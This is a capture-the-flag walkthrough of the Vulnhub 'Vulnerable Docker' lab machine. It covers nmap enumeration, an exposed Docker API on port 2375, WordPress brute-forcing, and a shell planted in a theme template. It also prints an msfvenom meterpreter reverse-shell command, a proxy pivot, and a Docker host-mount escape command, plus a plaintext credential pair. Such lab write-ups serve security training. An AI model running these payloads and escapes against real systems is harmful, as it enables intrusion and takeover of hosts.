# Vulnhub- Vulnerable Docker (Easy)

<img src="https://imgur.com/h5mOkkp.png"/>

We don't need to use `netdiscover` or any other tool to get IP of the box since it already shows at login banner

## NMAP

```
nmap -p- -sC -sV <ip>

PORT     STATE SERVICE VERSION                                            
22/tcp   open  ssh     OpenSSH 6.6p1 Ubuntu 2ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                            
|   1024 45:13:08:81:70:6d:46:c3:50:ed:3c:ab:ae:d6:e1:85 (DSA)            
|   2048 4c:e7:2b:01:52:16:1d:5c:6b:09:9d:3d:4b:bb:79:90 (RSA)
|   256 cc:2f:62:71:4c:ea:6c:a6:d8:a7:4f:eb:82:2a:22:ba (ECDSA)
|_  256 73:bf:b4:d6:ad:51:e3:99:26:29:b7:42:e3:ff:c3:81 (ED25519)
2375/tcp open  docker  Docker 17.06.0-ce                                  
| docker-version:                                                         
|   BuildTime: 2017-06-23T21:17:13.228983331+00:00                        
|   Arch: amd64
|   KernelVersion: 3.13.0-128-generic 
|   ApiVersion: 1.30
|   MinAPIVersion: 1.12
|   GitCommit: 02c1d87
|   Version: 17.06.0-ce
|   GoVersion: go1.8.3
|_  Os: linux
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: application/json
|     Date: Wed, 24 Mar 2021 18:06:13 GMT
|     Content-Length: 29
|     {"message":"page not found"}
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: application/json
|     Date: Wed, 24 Mar 2021 18:05:48 GMT
|     Content-Length: 29
|     {"message":"page not found"}
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Api-Version: 1.30
|     Docker-Experimental: false
|     Ostype: linux
|     Server: Docker/17.06.0-ce (linux)
|     Date: Wed, 24 Mar 2021 18:05:48 GMT
|     Content-Length: 0
|     Content-Type: text/plain; charset=utf-8
|   docker: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
8000/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.8.1
| http-robots.txt: 1 disallowed entry  
|_/wp-admin/
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: NotSoEasy Docker &#8211; Just another WordPress site
MAC Address: 08:00:27:D7:94:9E (Oracle VirtualBox virtual NIC)
```


## PORT 2375 (Docker)

Since docker api is exposed we can try connecting to port by listing images

<img src="https://imgur.com/hnjrDSL.png"/>

We can also see which containers are currently running

<img src="https://imgur.com/YxHjEAB.png"/>


wordpress:WordPressISBest

## PORT 8000

<img src="https://imgur.com/guNMn4m.png"/>


<img src="https://imgur.com/OqNbLSP.png"/>

Running `wpscan`

<img src="https://imgur.com/Hk25WEl.png"/>

<img src="https://imgur.com/XssFFIb.png"/>

We can now bruteforce the password for `bob`

<img src="https://imgur.com/ixKiiIJ.png"/>

<img src="https://imgur.com/BFwRiFu.png"/>

Using these credentials we can login to wordpress site

<img src="https://imgur.com/I78p0Dv.png"/>

To get a shelll we can edit `404.php` template of the currently active theme

<img src="https://imgur.com/MDkzO7n.png"/>

<img src="https://imgur.com/fm1m8AZ.png"/>

Alternatively you can get a meterpreter shell my generating a payload with `msfvenom`

<img src="https://imgur.com/89Ia2QK.png"/>

<img src="https://imgur.com/bOD2D65.png"/>

<img src="https://imgur.com/4cL3cLZ.png"/>

Now in order to do pivoting web shell are not stable (in both windows and linux ) so after we got the intial foothold we may need to stablize our shell in meterpreter we have to sepefically generate a linux payload 

`msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f elf > shell.elf`

<img src="https://imgur.com/92q68tm.png"/>

<img src="https://imgur.com/ugE5apb.png"/>

### Unstable shell

<img src="https://imgur.com/ERLhjBU.png"/>

### New meterpreter shell

<img src="https://imgur.com/7IsF5dj.png"/>

<img src="https://imgur.com/tXpFMT8.png"/>

Now we have added the route to subnet `172.18.0.0` for docker container , we can now scan for open ports on the container and since there are more as we saw from enumerating docker port

<img src="https://imgur.com/B5c7GUq.png"/>

Start `socks4a proxy`

<img src="https://imgur.com/rjsvdRF.png"/>

Use `foxyproxy` to switch to socks4a proxy and since port 8022 is open we can see what's there

<img src="https://imgur.com/cCbqScc.png"/>

<img src="https://imgur.com/fuZoPcy.png"/>

<img src="https://imgur.com/wwDahXe.png"/>

This container has `docker.sock` which allows to communicate with docker meaning creating , adding ,deleting container so there's a trick to mount the host system on the docker container by uploading `docker` and run command `docker run -it -v /:/host/ <container_name> chroot /host/ bash ` binary instead we have docker port and we can access those container so we can remotely do this 

`docker -H tcp://192.168.1.7:2375 run --rm -it -v /:/host wordpress chroot /host bash`

<img src="https://imgur.com/oSqmaSo.png"/>

And we can read the the flag which means we are on a host machine

<img src="https://imgur.com/CiZFvRi.png"/>